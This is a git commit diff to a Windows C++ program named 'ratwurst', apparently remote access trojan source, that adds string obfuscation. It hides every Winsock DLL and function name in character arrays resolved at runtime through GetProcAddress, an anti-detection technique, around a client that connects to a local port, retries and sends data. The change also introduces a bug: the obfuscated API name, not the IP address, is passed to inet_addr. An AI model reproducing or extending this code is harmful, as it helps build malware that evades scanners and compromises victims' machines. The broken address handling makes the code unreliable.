0036935ccc611deb3160f42c98025610c0c1979f
AccidentalRebel <accidentalrebel@gmail.com>
2021-07-02 02:54:15 +0800

    Simple obfuscation for the strings.

--- code/ratwurst.cpp
+++ code/ratwurst.cpp
@@ -19,7 +19,8 @@ WinMain(HINSTANCE hInstance,
 		LPSTR lpCmdLine,
 		int nCmdShow)
 {
-	HMODULE libraryWinsock2 = LoadLibraryA("Ws2_32.dll");
+	char ca_ws2_32[] = {'W','s','2','_','3','2','.','d','l','l', 0};
+	HMODULE libraryWinsock2 = LoadLibraryA(ca_ws2_32);
 	if ( !libraryWinsock2 )
 	{
 		OutputDebugStringA("Loading libraryWinsock2 failed.");
@@ -28,58 +29,71 @@ WinMain(HINSTANCE hInstance,
 	
 	WSADATA wsaData;
 
-	_WSAGetLastError *fWSAGetLastError = (_WSAGetLastError*)GetProcAddress(libraryWinsock2, "WSAGetLastError");
-	_WSAStartup* fWSAStartup = (_WSAStartup*)GetProcAddress(libraryWinsock2, "WSAStartup");
-    if ( fWSAStartup(MAKEWORD(2,2), &wsaData) != NO_ERROR ) {
+	char ca_WSAGetLastError[] = { 'W','S','A','G','e','t','L','a','s','t','E','r','r','o','r', 0 };
+	char ca_WSAStartup[] = { 'W','S','A','S','t','a','r','t','u','p',0 };
+	_WSAGetLastError *f_WSAGetLastError = (_WSAGetLastError*)GetProcAddress(libraryWinsock2, ca_WSAGetLastError);
+	_WSAStartup* f_WSAStartup = (_WSAStartup*)GetProcAddress(libraryWinsock2, ca_WSAStartup);
+    if ( f_WSAStartup(MAKEWORD(2,2), &wsaData) != NO_ERROR ) {
 		OutputDebugStringA("WSAStartup failed.");
         return 1;
     }
 
-	_socket* fSocket = (_socket*)GetProcAddress(libraryWinsock2, "socket");
+	char ca_socket[] = { 's','o','c','k','e','t',0 };
+	_socket* f_socket = (_socket*)GetProcAddress(libraryWinsock2, ca_socket);
 
 	SOCKET socketConnection;
-	socketConnection = fSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	socketConnection = f_socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	if ( socketConnection == INVALID_SOCKET )
 	{	
 		char buffer[256];
-		sprintf(buffer, "Socket failed with error: %ld\n", fWSAGetLastError());
+		sprintf(buffer, "Socket failed with error: %ld\n", f_WSAGetLastError());
 		OutputDebugStringA(buffer);
 
-		_WSACleanup* fWSACleanup = (_WSACleanup*)GetProcAddress(libraryWinsock2, "WSACleanup");
-        fWSACleanup();
+		char ca_WSACleanup[] = { 'W','S','A','C','l','e','a','n','u','p',0 };
+		_WSACleanup* f_WSACleanup = (_WSACleanup*)GetProcAddress(libraryWinsock2, ca_WSACleanup);
+        f_WSACleanup();
         return 1;
 	}
 
-	_htons* fHtons = (_htons*)GetProcAddress(libraryWinsock2, "htons");
-	_inet_addr* fInet_addr = (_inet_addr*)GetProcAddress(libraryWinsock2, "inet_addr");
+	char ca_htons[] = { 'h','t','o','n','s',0 };
+	char ca_inet_addr[] = { 'i','n','e','t','_','a','d','d','r',0 };
+	
+	_htons* f_htons = (_htons*)GetProcAddress(libraryWinsock2, ca_htons);
+	_inet_addr* f_inet_addr = (_inet_addr*)GetProcAddress(libraryWinsock2, ca_inet_addr);
+
+	char ca_ip_addr[] = { '1','2','7','.','0','.','0','.','1', 0 };
 	
 	struct sockaddr_in socketAddress;
     socketAddress.sin_family = AF_INET;
-	socketAddress.sin_port = fHtons(65432);
-	socketAddress.sin_addr.s_addr = fInet_addr("127.0.0.1");
+	socketAddress.sin_port = f_htons(65432);
+	socketAddress.sin_addr.s_addr = f_inet_addr(ca_inet_addr);
 
-	_connect* fConnect = (_connect*)GetProcAddress(libraryWinsock2, "connect");
-	if ( fConnect(socketConnection, (SOCKADDR*) &socketAddress, sizeof(socketAddress)) == SOCKET_ERROR )
+	char ca_connect[] = { 'c','o','n','n','e','c','t', 0};
+	_connect* f_connect = (_connect*)GetProcAddress(libraryWinsock2, ca_connect);
+	if ( f_connect(socketConnection, (SOCKADDR*) &socketAddress, sizeof(socketAddress)) == SOCKET_ERROR )
 	{
 		char buffer[256];
-		sprintf(buffer, "Socket failed with error: %ld\nReconnecting...", fWSAGetLastError());
+		sprintf(buffer, "Socket failed with error: %ld\nReconnecting...", f_WSAGetLastError());
 		OutputDebugStringA(buffer);
 
 		// Try to reconnect
-		_closesocket* fCloseSocket = (_closesocket*)GetProcAddress(libraryWinsock2, "closesocket");
-		fCloseSocket(socketConnection);
+		char ca_closesocket[] = { 'c','l','o','s','e','s','o','c','k','e','t',0 };
+		_closesocket* f_closesocket = (_closesocket*)GetProcAddress(libraryWinsock2, ca_closesocket);
+		f_closesocket(socketConnection);
 
-		_WSACleanup* fWSACleanup = (_WSACleanup*)GetProcAddress(libraryWinsock2, "WSACleanup");
-		fWSACleanup();
+		char ca_WSACleanup[] = { 'W','S','A','C','l','e','a','n','u','p',0 };
+		_WSACleanup* f_WSACleanup = (_WSACleanup*)GetProcAddress(libraryWinsock2, ca_WSACleanup);
+		f_WSACleanup();
 		Sleep(2000);
 	}
 
-	_send* fSend = (_send*)GetProcAddress(libraryWinsock2, "send");
+	char ca_send[] = { 's','e','n','d', 0};
+	_send* f_send = (_send*)GetProcAddress(libraryWinsock2, ca_send);
 	const char* socketBuffer = "THIS IS A TEST.";
-	if ( fSend(socketConnection, socketBuffer, (int)strlen(socketBuffer), 0) == SOCKET_ERROR )
+	if ( f_send(socketConnection, socketBuffer, (int)strlen(socketBuffer), 0) == SOCKET_ERROR )
 	{
 		char buffer[256];
-		sprintf(buffer, "Socket failed with error: %ld\n", fWSAGetLastError());
+		sprintf(buffer, "Socket failed with error: %ld\n", f_WSAGetLastError());
 		OutputDebugStringA(buffer);
 	}
 	
